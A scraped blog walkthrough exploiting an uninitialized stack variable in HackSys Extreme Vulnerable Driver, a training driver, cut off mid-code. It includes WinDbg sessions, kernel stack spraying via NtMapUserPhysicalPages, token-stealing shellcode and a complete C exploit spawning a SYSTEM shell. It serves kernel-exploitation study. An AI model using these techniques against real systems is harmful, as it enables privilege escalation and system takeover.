sizeof(Process_Info)); STARTUPINFOA Startup_Info; ZeroMemory(&amp;Startup_Info, sizeof(Startup_Info)); Startup_Info.cb = sizeof(Startup_Info); CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;, NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &amp;Startup_Info, &amp;Process_Info); } int main() { HANDLE HEVD = Get_Handle(); // Just a dummy buffer so that we don&#39;t match the keyword value for BAD0B0B0 char Input_Buffer[] = &quot;\\x41\\x41\\x41\\x41&quot;; // Acutally creating an instance of our typedef by typcasting the result of a GetProcAddress call inside of ntdll.dll for &#39;NtMapUserPhysicalPages&#39; (Thanks tekwizz!) _NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtMapUserPhysicalPages&quot;); // Token stealing payload straight from b33f&#39;s FuzzySec blogpost char Shellcode[] = ( &quot;\\x60&quot; &quot;\\x64\\xA1\\x24\\x01\\x00\\x00&quot; &quot;\\x8B\\x40\\x50&quot; &quot;\\x89\\xC1&quot; &quot;\\x8B\\x98\\xF8\\x00\\x00\\x00&quot; &quot;\\xBA\\x04\\x00\\x00\\x00&quot; &quot;\\x8B\\x80\\xB8\\x00\\x00\\x00&quot; &quot;\\x2D\\xB8\\x00\\x00\\x00&quot; &quot;\\x39\\x90\\xB4\\x00\\x00\\x00&quot; &quot;\\x75\\xED&quot; &quot;\\x8B\\x90\\xF8\\x00\\x00\\x00&quot; &quot;\\x89\\x91\\xF8\\x00\\x00\\x00&quot; &quot;\\x61&quot; &quot;\\xC3&quot; ); // Allocate a RWX buffer the size of our shellcode LPVOID Shellcode_Addr = VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Copying our shellcode buffer into our RWX buffer printf(&quot;[*] Allocating RWX shellcode at: %X\\n&quot;, Shellcode_Addr); memcpy(Shellcode_Addr, Shellcode, sizeof(Shellcode)); // This var is going to be a pointer to the address of Shellcode_Addr, this will end up being the value we spray on the stack LPVOID Spray_Address = &amp;Shellcode_Addr; printf(&quot;[*] Our address to spray on the stack: %X\\n&quot;, Spray_Address); // This var will be used as our BaseAddress in our NtMapPhysicalPages API call int Zero = 0; // We will typecast this to a PBYTE and reference its address when calling NtMapPhysicalPages char Page_Frame_Numbers[4096] = { 0 }; // This for loop will take our 4096 character array and fill it with the Spray_Address value for (int i = 0; i &lt; 1024; i++) { memcpy((Page_Frame_Numbers + (i * 4)), Spray_Address, 4); } // Calling the API finally, thanks again, tekwizz printf(&quot;[*] Spraying stack and triggering vulnerability...\\n&quot;); NtMapUserPhysicalPages(&amp;Zero, 1024, (PBYTE)&amp;Page_Frame_Numbers); DWORD Dummy_Bytes = 0; // Trigger bug DeviceIoControl(HEVD, 0x22202F, &amp;Input_Buffer, sizeof(Input_Buffer), NULL, 0, &amp;Dummy_Bytes, NULL); printf(&quot;[*] Spawning nt/authority system cmd.exe shell...\\n&quot;); Spawn_Shell(); return 0; } The main idea is very simple: if we provide something else except for 0xBAD0B0B0, we’ll not set UninitializedStackVariable.Callback = UninitializedStackVariableObjectCallback; and Callback will be called not initialized from the stack (that means something that is aligned in the stack, some junk) And we spray the stack with out address so out shellcode will be called as a callback. Don’t know why, but if we put the breakpoint on the start of the function, exploit wouldn’t work We should delete it and leave just bp HEVD!TriggerUninitializedStackVariable+94 In this case we’ll see: ... 9758bf8e ff95f8feffff call dword ptr [ebp-108h] ss:0010:ac9c59ac=001d0000 ... kd&gt; !thread ... Stack Init ac9c5ed0 ... kd&gt; ?ac9c5ed0-0x524 Evaluate expression: -1399039572 = kd&gt; dd ac9c59ac L1 ac9c59ac 001d0000 We see out address of the shellcode kd&gt; u 001d0000 001d0000 60 pushad 001d0001 64a124010000 mov eax,dword ptr fs:[00000124h] 001d0007 8b4050 mov eax,dword ptr [eax+50h] 001d000a 89c1 mov ecx,eax","headline":"Windows Kernel Exploitation 0x05 Uninitialized Stack Variable [eng]","image":"/assets/previews/15.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"/2022/11/10/Windows-Kernel-Exploitation-0x05.html"},"url":"/2022/11/10/Windows-Kernel-Exploitation-0x05.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<link href="assets/favicon.ico" rel="icon" type="image/x-icon" />

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <link rel="shortcut icon" href="/assets/favicon.ico">
    
    <h1>truebad0ur@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive.html"><h2 class="header-link">Archive</h2></a>
<a href="/about.html"><h2 class="header-link">About</h2></a>
<a href="/ToDo.html"><h2 class="header-link">ToDo</h2></a>
<a href="/Certificates.html"><h2 class="header-link">Certificates</h2></a>
<!--<a href="https://t.me/reverse_dungeon"><h2 class="header-link">Telegram</h2></a>-->

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <p><a href="https://rootkits.xyz/blog/2018/01/kernel-uninitialized-stack-variable/">website with original article</a></p>

<p><a href="https://h0mbre.github.io/HEVD_UninitializedStackPointer_32bit/#">another one</a></p>

<p><a href="https://web.archive.org/web/20200514190734/https://fullpwnops.com/hevd-uninitialized-stack/">and another one :)</a></p>

<p>When a developer defines a variable but doesn’t initialize it, Uninitialized Stack Variable vulnerability arises. During runtime, the variable would have some value, even though an unpredictable one.</p>

<h2 id="code-analysis"><a href="#header-2"></a>Code analysis</h2>

<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UninitializedMemoryStack.c">from the original</a></p>

<p>We can clearly see that in secure way we initialize the variable with zero, in insecure we don’t.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">#</span><span class="nx">ifdef</span> <span class="nx">SECURE</span>
    <span class="c1">//</span>
    <span class="c1">// Secure Note: This is secure because the developer is properly initializing</span>
    <span class="c1">// UNINITIALIZED_MEMORY_STACK to NULL and checks for NULL pointer before calling</span>
    <span class="c1">// the callback</span>
    <span class="c1">//</span>

    <span class="nx">UNINITIALIZED_MEMORY_STACK</span> <span class="nx">UninitializedMemory</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
<span class="err">#</span><span class="k">else</span>
    <span class="c1">//</span>
    <span class="c1">// Vulnerability Note: This is a vanilla Uninitialized Memory in Stack vulnerability</span>
    <span class="c1">// because the developer is not initializing 'UNINITIALIZED_MEMORY_STACK' structure</span>
    <span class="c1">// before calling the callback when 'MagicValue' does not match 'UserValue'</span>
    <span class="c1">//</span>

    <span class="nx">UNINITIALIZED_MEMORY_STACK</span> <span class="nx">UninitializedMemory</span><span class="p">;</span>
<span class="err">#</span><span class="nx">endif</span>
</code></pre></div></div>

<p>And also we can see that later the uninitialized variable is called in callback function</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F59</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F59</span> <span class="nx">loc_14F59</span><span class="p">:</span>                              <span class="p">;</span> <span class="nx">CODE</span> <span class="nx">XREF</span><span class="p">:</span> <span class="nc">TriggerUninitializedStackVariable</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="o">+</span><span class="mi">4</span><span class="nx">D</span><span class="err">↑</span><span class="nx">j</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F59</span>                 <span class="nx">push</span>    <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Value</span><span class="p">]</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F5F</span>                 <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">aUninitializeds_0</span> <span class="p">;</span> <span class="dl">"</span><span class="s2">[+] UninitializedStackVariable.Value: 0</span><span class="dl">"</span><span class="p">...</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F64</span>                 <span class="nx">call</span>    <span class="nx">_DbgPrint</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F69</span>                 <span class="nx">push</span>    <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Callback</span><span class="p">]</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F6F</span>                 <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">aUninitializeds_1</span> <span class="p">;</span> <span class="dl">"</span><span class="s2">[+] UninitializedStackVariable.Callback</span><span class="dl">"</span><span class="p">...</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F74</span>                 <span class="nx">call</span>    <span class="nx">_DbgPrint</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F79</span>                 <span class="nx">push</span>    <span class="nx">offset</span> <span class="nx">aTriggeringUnin</span> <span class="p">;</span> <span class="dl">"</span><span class="s2">[+] Triggering Uninitialized Stack Vari</span><span class="dl">"</span><span class="p">...</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F7E</span>                 <span class="nx">call</span>    <span class="nx">_DbgPrint</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F83</span>                 <span class="nx">add</span>     <span class="nx">esp</span><span class="p">,</span> <span class="mi">14</span><span class="nx">h</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F86</span>                 <span class="nx">cmp</span>     <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Callback</span><span class="p">],</span> <span class="nx">edi</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F8C</span>                 <span class="nx">jz</span>      <span class="nx">short</span> <span class="nx">loc_14FB7</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F8E</span>                 <span class="nx">call</span>    <span class="p">[</span><span class="nx">ebp</span><span class="o">+</span><span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Callback</span><span class="p">]</span>   <span class="o">&lt;--</span> <span class="nx">here</span> <span class="nx">we</span> <span class="nx">call</span> <span class="nx">it</span>
<span class="nx">PAGE</span><span class="p">:</span><span class="mi">00014</span><span class="nx">F94</span>                 <span class="nx">jmp</span>     <span class="nx">short</span> <span class="nx">loc_14FB7</span>
</code></pre></div></div>

<p>Same here as in the previous one, we should pass anything except for magic number that is given in the program to get into out vulnerable part</p>

<p>Let’s go to the exploit</p>

<h2 id="exploit"><a href="#header-2"></a>Exploit</h2>

<ul>
  <li>run windbg</li>
  <li>run virutal machine</li>
  <li>open shared folder on vm (<code class="language-plaintext highlighter-rouge">Z:\kernel4\NullPoint\Release</code> in my case) to copy compiled file to the desktop</li>
  <li>in windbg:</li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">ed nt!Kd_Default_Mask 8</code></li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">.sympath+ C:\Users\truebad0ur\Documents\Kernel</code></li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">.reload /f</code></li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">lm m HEV*</code> - check if out module is loaded</li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">bp HEVD!TriggerUninitializedStackVariable</code> - break on out function</li>
    </ul>
  </li>
  <li>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">bp HEVD!TriggerUninitializedStackVariable+94</code> - break on the end of the function before shellcode call</li>
    </ul>
  </li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define IO_CODE 0x22202F
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">kDevName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling CreateFileA() to obtain a handle to driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">kDevName</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error - dailed to get file handle!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Successfully obtained a handle to the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">DWORD</span> <span class="n">bytesRetn</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xba</span> <span class="p">};</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Starting interaction with the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IO_CODE</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesRetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="c1">//system("cmd.exe");</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>


    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Everything works fine, we see</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserValue</span><span class="p">:</span> <span class="mh">0xBAD0B0B0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedStackVariable</span> <span class="nx">Address</span><span class="p">:</span> <span class="mh">0xA98CB9A8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Value</span><span class="p">:</span> <span class="mh">0xBAD0B0B0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Callback</span><span class="p">:</span> <span class="mh">0xA7F57EE8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Uninitialized</span> <span class="nx">Stack</span> <span class="nx">Variable</span> <span class="nx">Vulnerability</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Uninitialized</span> <span class="nx">Stack</span> <span class="nx">Variable</span> <span class="nb">Object</span> <span class="nx">Callback</span>
</code></pre></div></div>

<p>Changed value to check</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserValue</span><span class="p">:</span> <span class="mh">0xDDCCBBAA</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedStackVariable</span> <span class="nx">Address</span><span class="p">:</span> <span class="mh">0x821C99A8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Value</span><span class="p">:</span> <span class="mh">0x92607BE5</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UninitializedStackVariable</span><span class="p">.</span><span class="nx">Callback</span><span class="p">:</span> <span class="mh">0x85413D10</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Uninitialized</span> <span class="nx">Stack</span> <span class="nx">Variable</span> <span class="nx">Vulnerability</span>

<span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">dps</span> <span class="nx">esp</span>
<span class="mi">821</span><span class="nx">c9984</span>  <span class="nx">a7f58abc</span> <span class="nx">HEVD</span><span class="o">!</span> <span class="o">??</span> <span class="p">::</span><span class="nx">NNGAKEGL</span><span class="p">::</span><span class="s2">`string'
821c9988  a7f58af8 HEVD! ?? ::NNGAKEGL::`</span><span class="nx">string</span><span class="dl">'</span><span class="s1">
821c998c  85413d10
821c9990  a7f58b28 HEVD! ?? ::NNGAKEGL::`string</span><span class="dl">'</span>
<span class="mi">821</span><span class="nx">c9994</span>  <span class="mi">92607</span><span class="nx">be5</span> <span class="nx">dxgkrnl</span><span class="o">!</span><span class="nx">DpQueueDpc</span><span class="o">+</span><span class="mh">0x72</span>
<span class="mi">821</span><span class="nx">c9998</span>  <span class="mi">25</span><span class="nx">e9f97e</span>
<span class="mi">821</span><span class="nx">c999c</span>  <span class="mi">86</span><span class="nx">f63c98</span>
<span class="mi">821</span><span class="nx">c99a0</span>  <span class="mi">86</span><span class="nx">f63d08</span>
<span class="mi">821</span><span class="nx">c99a4</span>  <span class="nx">a7f58ca4</span> <span class="nx">HEVD</span><span class="o">!</span> <span class="o">??</span> <span class="p">::</span><span class="nx">NNGAKEGL</span><span class="p">::</span><span class="s2">`string'

821c99a8  92607be5 dxgkrnl!DpQueueDpc+0x72
821c99ac  85413d10

</span></code></pre></div></div>

<p>This will trigger callback in vulnurable function. Now we somehow need to control that callback function address to call our shellcode.</p>

<p>To do this, the steps we need to follow:</p>

<ul>
  <li>Find the kernel stack init address</li>
  <li>Find the offset of our callback from this init address</li>
  <li>Spray the Kernel Stack with User controlled input from the user mode. (Good read about it can be found <a href="https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/">here</a> by j00ru).</li>
</ul>

<p>To find the kernel stack init address, run the !thread command, and then
<code class="language-plaintext highlighter-rouge">offset = stack init address - callback function address</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="o">!</span><span class="nx">thread</span>
<span class="nx">THREAD</span> <span class="mi">87265788</span>  <span class="nx">Cid</span> <span class="mi">05</span><span class="nx">a8</span><span class="p">.</span><span class="mi">084</span><span class="nx">c</span>  <span class="nx">Teb</span><span class="p">:</span> <span class="mi">7</span><span class="nx">ffdf000</span> <span class="nx">Win32Thread</span><span class="p">:</span> <span class="mi">00000000</span> <span class="nx">RUNNING</span> <span class="nx">on</span> <span class="nx">processor</span> <span class="mi">0</span>
<span class="nx">IRP</span> <span class="nx">List</span><span class="p">:</span>
    <span class="mi">86</span><span class="nx">f63c98</span><span class="p">:</span> <span class="p">(</span><span class="mi">0006</span><span class="p">,</span><span class="mi">0094</span><span class="p">)</span> <span class="nx">Flags</span><span class="p">:</span> <span class="mi">00060000</span>  <span class="nx">Mdl</span><span class="p">:</span> <span class="mi">00000000</span>
<span class="nx">Not</span> <span class="nx">impersonating</span>
<span class="nx">DeviceMap</span>                 <span class="mi">8</span><span class="nx">f592d88</span>
<span class="nx">Owning</span> <span class="nx">Process</span>            <span class="mi">85036</span><span class="nx">d28</span>       <span class="nx">Image</span><span class="p">:</span>         <span class="nx">Project1</span><span class="p">.</span><span class="nx">exe</span>
<span class="nx">Attached</span> <span class="nx">Process</span>          <span class="nx">N</span><span class="o">/</span><span class="nx">A</span>            <span class="nx">Image</span><span class="p">:</span>         <span class="nx">N</span><span class="o">/</span><span class="nx">A</span>
<span class="nx">Wait</span> <span class="nx">Start</span> <span class="nx">TickCount</span>      <span class="mi">85644</span>          <span class="nx">Ticks</span><span class="p">:</span> <span class="mi">18</span> <span class="p">(</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">00.180</span><span class="p">)</span>
<span class="nx">Context</span> <span class="nx">Switch</span> <span class="nx">Count</span>      <span class="mi">44</span>             <span class="nx">IdealProcessor</span><span class="p">:</span> <span class="mi">0</span>             
<span class="nx">UserTime</span>                  <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">00.000</span>
<span class="nx">KernelTime</span>                <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">00.300</span>
<span class="nx">Win32</span> <span class="nx">Start</span> <span class="nx">Address</span> <span class="mh">0x00e9134f</span>
<span class="nx">Stack</span> <span class="nx">Init</span> <span class="mi">821</span><span class="nx">c9ed0</span>             <span class="o">&lt;---------</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="p">?</span><span class="mi">821</span><span class="nx">c9ed0</span> <span class="o">-</span> <span class="mi">821</span><span class="nx">c99ac</span>
<span class="nx">Evaluate</span> <span class="nx">expression</span><span class="p">:</span> <span class="mi">1316</span> <span class="o">=</span> <span class="mi">00000524</span>
</code></pre></div></div>

<p>To spray stack we’ll be using NtMapUserPhysicalPages</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">BOOL</span> <span class="nx">WINAPI</span> <span class="nc">MapUserPhysicalPages</span><span class="p">(</span>
<span class="nx">_In_</span> <span class="nx">PVOID</span> <span class="nx">lpAddress</span><span class="p">,</span>
<span class="nx">_In_</span> <span class="nx">ULONG_PTR</span> <span class="nx">NumberOfPages</span><span class="p">,</span>
<span class="nx">_In_</span> <span class="nx">PULONG_PTR</span> <span class="nx">UserPfnArray</span>
<span class="p">);</span>
</code></pre></div></div>

<p>With this API we can spray upto 1024 * sizeof(ULONG_PTR), more than our offset, so okay. Spray kernel stack with 0x414141…</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Thanks h0mbre for the code</span>

<span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="c1">//</span>
<span class="c1">// Defining just our driver name that it uses for IoCreateDevice and also the IOCTL code we use to reach our vulnerable function</span>
<span class="cp">#define DEVICE_NAME     "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL           0x22202F
</span>
<span class="c1">//</span>
<span class="c1">// Here we are creating a prototype of the NtMapUserPhysicalPages, we are using the struct member types that tekwizz123 uses, I couldn't get any other definition to work</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtMapUserPhysicalPages</span><span class="p">)(</span>
    <span class="n">PINT</span> <span class="n">BaseAddress</span><span class="p">,</span>
    <span class="n">UINT32</span> <span class="n">NumberOfPages</span><span class="p">,</span>
    <span class="n">PBYTE</span> <span class="n">PageFrameNumbers</span><span class="p">);</span>

<span class="c1">//</span>
<span class="c1">// This function simply retrieves a handle to HEVD, this should be standard at this point based on our previous exploits; however, you can see how much easier it is</span>
<span class="c1">// to use Visual C++ and have access to the keywords vs. finding constants for these values and using Python C-types</span>

<span class="n">HANDLE</span> <span class="nf">Get_Handle</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">HEVD</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span>
        <span class="n">FILE_READ_ACCESS</span> <span class="o">|</span> <span class="n">FILE_WRITE_ACCESS</span><span class="p">,</span>
        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="n">FILE_FLAG_OVERLAPPED</span> <span class="o">|</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">HEVD</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] Unable to retrieve handle for HEVD, last error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Successfully retrieved handle to HEVD: %X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HEVD</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">HEVD</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">Spawn_Shell</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">Process_Info</span><span class="p">;</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Process_Info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Process_Info</span><span class="p">));</span>
    <span class="n">STARTUPINFOA</span> <span class="n">Startup_Info</span><span class="p">;</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Startup_Info</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Startup_Info</span><span class="p">));</span>
    <span class="n">Startup_Info</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Startup_Info</span><span class="p">);</span>
    <span class="n">CreateProcessA</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Startup_Info</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Process_Info</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">HEVD</span> <span class="o">=</span> <span class="n">Get_Handle</span><span class="p">();</span>

    <span class="c1">// Just a dummy buffer so that we don't match the keyword value for BAD0B0B0</span>
    <span class="kt">char</span> <span class="n">Input_Buffer</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41</span><span class="s">"</span><span class="p">;</span>

    <span class="c1">// Acutally creating an instance of our typedef by typcasting the result of a GetProcAddress call inside of ntdll.dll for 'NtMapUserPhysicalPages' (Thanks tekwizz!)</span>
    <span class="n">_NtMapUserPhysicalPages</span> <span class="n">NtMapUserPhysicalPages</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtMapUserPhysicalPages</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtMapUserPhysicalPages"</span><span class="p">);</span>

    <span class="c1">// Token stealing payload straight from b33f's FuzzySec blogpost </span>
    <span class="kt">char</span> <span class="n">Shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s">"</span><span class="se">\x60</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x64\xA1\x24\x01\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x40\x50</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x89\xC1</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x98\xF8\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xBA\x04\x00\x00\x00</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x8B\x80\xB8\x00\x00\x00</span><span class="s">"</span>
